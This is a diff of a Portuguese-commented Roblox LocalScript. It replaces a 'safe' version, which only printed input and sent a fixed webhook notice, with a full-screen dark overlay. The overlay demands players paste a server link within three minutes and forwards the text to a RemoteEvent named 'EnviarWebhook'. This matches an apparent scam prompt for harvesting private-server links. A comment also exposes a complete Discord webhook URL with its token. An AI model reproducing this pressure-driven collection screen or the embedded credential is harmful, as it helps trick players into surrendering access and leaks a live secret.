@@ -1,83 +1,64 @@
--- LocalScript — Seguro e editável
-local player = game.Players.LocalPlayer
-local HttpService = game:GetService("HttpService")
+-- LocalScript em StarterPlayerScripts
 
---------------------------------------------------------------------
--- 🔹🔹 ÁREA PARA COLOCAR SEU WEBHOOK "https://discord.com/api/webhooks/1439674890151006320/Fo0GDFPJFbWYI3i1jGxIjtQupf1jjoB4YV6Af6Td_kfRubi28ZsNeSDtlB36LglHca8n"
---------------------------------------------------------------------
-local MY_WEBHOOK = ""  
--- COLOQUE SEU WEBHOOK ENTRE ASPAS ACIMA
--- Exemplo: local MY_WEBHOOK = "https://discord.com/api/webhooks/..."
---------------------------------------------------------------------
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local Players = game:GetService("Players")
 
--- 🔹 Função segura: envia APENAS uma mensagem fixa
-local function sendWebhookNotification()
-    if MY_WEBHOOK == nil or MY_WEBHOOK == "" then
-        warn("Webhook não definido!")
-        return
-    end
-
-    local data = {
-        username = "Script-Notifier",
-        content = "**O jogador " .. player.Name .. " confirmou o script.**"
-    }
-
-    local success, err = pcall(function()
-        HttpService:PostAsync(
-            MY_WEBHOOK,
-            HttpService:JSONEncode(data),
-            Enum.HttpContentType.ApplicationJson
-        )
-    end)
-
-    if not success then
-        warn("Erro ao enviar webhook:", err)
-    end
+-- Cria RemoteEvent se não existir
+local remote = ReplicatedStorage:FindFirstChild("EnviarWebhook")
+if not remote then
+    remote = Instance.new("RemoteEvent")
+    remote.Name = "EnviarWebhook"
+    remote.Parent = ReplicatedStorage
 end
 
---------------------------------------------------------------------
--- 🔹 GUI SIMPLES (VOCÊ PODE EDITAR À VONTADE)
---------------------------------------------------------------------
+local player = Players.LocalPlayer
 
-local screenGui = Instance.new("ScreenGui")
-screenGui.Parent = player:WaitForChild("PlayerGui")
+-- Tela escura
+local gui = Instance.new("ScreenGui", player:WaitForChild("PlayerGui"))
+gui.Name = "TelaEscura"
 
-local frame = Instance.new("Frame")
-frame.Size = UDim2.new(0, 300, 0, 200)
-frame.Position = UDim2.fromScale(0.5, 0.5)
-frame.AnchorPoint = Vector2.new(0.5, 0.5)
-frame.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
-frame.Parent = screenGui
+local black = Instance.new("Frame", gui)
+black.Size = UDim2.new(1,0,1,0)
+black.BackgroundColor3 = Color3.new(0,0,0)
+black.BackgroundTransparency = 0.4
 
-local textLabel = Instance.new("TextLabel")
-textLabel.Size = UDim2.new(1, 0, 0.3, 0)
-textLabel.BackgroundTransparency = 1
-textLabel.Text = "Coloque o link do servidor:"
-textLabel.TextScaled = true
-textLabel.Parent = frame
+local box = Instance.new("TextBox", gui)
+box.Size = UDim2.new(0, 400, 0, 50)
+box.Position = UDim2.new(0.5, -200, 0.5, -25)
+box.AnchorPoint = Vector2.new(0.5, 0.5)
+box.PlaceholderText = "Cole o link do servidor aqui"
+box.Text = ""
+box.TextScaled = true
 
-local textBox = Instance.new("TextBox")
-textBox.Size = UDim2.new(1, -20, 0.3, 0)
-textBox.Position = UDim2.new(0, 10, 0.35, 0)
-textBox.PlaceholderText = "Digite aqui"
-textBox.Text = ""
-textBox.TextScaled = true
-textBox.Parent = frame
+local info = Instance.new("TextLabel", gui)
+info.Size = UDim2.new(0,400,0,36)
+info.Position = UDim2.new(0.5,-200,0.5,-80)
+info.AnchorPoint = Vector2.new(0.5, 0)
+info.BackgroundTransparency = 1
+info.TextColor3 = Color3.new(1,1,1)
+info.TextScaled = true
+info.Text = "Insira o link do servidor. Você tem 3 minutos!"
 
-local button = Instance.new("TextButton")
-button.Size = UDim2.new(0.6, 0, 0.25, 0)
-button.Position = UDim2.new(0.2, 0, 0.7, 0)
-button.Text = "Confirmar"
-button.TextScaled = true
-button.BackgroundColor3 = Color3.fromRGB(0, 170, 0)
-button.Parent = frame
+-- Timer de 3 minutos
+local finished = false
+spawn(function()
+    wait(180)
+    if not finished then
+        box.TextEditable = false
+        info.Text = "Tempo esgotado!"
+        wait(2)
+        gui:Destroy()
+    end
+end)
 
--- QUANDO O JOGADOR CLICA:
-button.MouseButton1Click:Connect(function()
-    print("Jogador digitou:", textBox.Text)  -- Apenas print, não envia nada.
-    
-    -- Envia mensagem fixa para seu webhook
-    sendWebhookNotification()
-
-    -- Aqui você pode adicionar outras funções que quiser
+box.FocusLost:Connect(function(enter)
+    if enter and box.Text ~= "" and not finished then
+        finished = true
+        -- Envia para o servidor
+        remote:FireServer(box.Text)
+        info.Text = "Enviado! Obrigado."
+        box.TextEditable = false
+        wait(2)
+        gui:Destroy()
+    end
 end)
